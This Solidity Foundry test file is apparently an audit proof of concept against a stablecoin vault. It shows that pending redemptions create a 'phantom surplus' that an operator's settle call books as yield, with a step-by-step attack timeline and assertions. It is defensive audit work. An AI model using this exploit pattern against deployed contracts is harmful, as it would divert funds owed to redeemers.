// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/interfaces/IMonetrixAccountant.sol";

// ATTACK TIMELINE:
// 1. [Setup] User1 deposits 100,000 USDC, receiving 100,000 USDM. Vault holds 100k USDC.
// 2. [T=0] User1 calls Vault.requestRedeem(50,000 USDM). Vault burns 50k USDM (reducing supply) and calls RedeemEscrow.addObligation(50k), but does NOT transfer USDC to RedeemEscrow yet.
// 3. [T=0] State: USDM supply dropped by 50k. Vault USDC balance is unchanged (100k). RedeemEscrow USDC balance is 0. Total backing = 100k.
// 4. [T=1 day] Accountant calculates surplus = totalBacking (100k) - USDM supply (50k) = 50k phantom surplus.
// 5. [T=1 day] Operator calls Vault.settle(50k) which calls Accountant.settleDailyPnL(50k). The 50k phantom surplus is declared as distributable yield.
// 6. [Assert] Verify accountant.totalSettledYield() increased by the phantom amount, proving USDC obligated to redeemers was misclassified as yield.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // 1. User1 deposits 100,000 USDC
        _depositAs(user1, 100_000e6);

        uint256 supplyBefore = usdm.totalSupply();
        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));
        uint256 settledYieldBefore = accountant.totalSettledYield();

        console.log("Step 1: supplyBefore =", supplyBefore);
        console.log("Step 1: vaultUsdcBefore =", vaultUsdcBefore);

        // 2. User1 requests redeem for 50,000 USDM
        vm.startPrank(user1);
        usdm.approve(address(vault), 50_000e6);
        vault.requestRedeem(50_000e6);
        vm.stopPrank();

        uint256 supplyAfter = usdm.totalSupply();
        uint256 vaultUsdcAfter = usdc.balanceOf(address(vault));
        uint256 redeemEscrowUsdc = usdc.balanceOf(address(redeemEscrow));
        uint256 totalOwed = redeemEscrow.totalOwed();

        console.log("Step 2: supplyAfter =", supplyAfter);
        console.log("Step 2: vaultUsdcAfter =", vaultUsdcAfter);
        console.log("Step 2: redeemEscrowUsdc =", redeemEscrowUsdc);
        console.log("Step 2: totalOwed =", totalOwed);

        // 3. Verify the phantom surplus condition:
        // Supply decreased, but Vault USDC hasn't moved to RedeemEscrow yet.
        assertLt(supplyAfter, supplyBefore, "USDM supply should decrease on requestRedeem");
        assertEq(vaultUsdcAfter, vaultUsdcBefore, "Vault USDC should not decrease yet");
        assertEq(redeemEscrowUsdc, 0, "RedeemEscrow USDC should not increase yet");
        assertEq(totalOwed, 50_000e6, "RedeemEscrow obligation should increase");

        // 4. Operator settles, declaring the phantom surplus as yield
        // The phantom surplus is roughly 50,000e6 because backing (100k) - supply (50k) = 50k
        uint256 phantomYield = 50_000e6;

        vm.warp(block.timestamp + 1 days);
        vm.prank(operator);
        vault.settle(phantomYield);

        // 5. Assert that the yield was incorrectly declared
        uint256 settledYieldAfter = accountant.totalSettledYield();
        console.log("Step 5: settledYieldAfter =", settledYieldAfter);

        assertGt(settledYieldAfter, settledYieldBefore, "Phantom yield was incorrectly settled from redeemer funds");
        assertGe(settledYieldAfter - settledYieldBefore, phantomYield, "Settled yield should match the phantom surplus");
    }
}
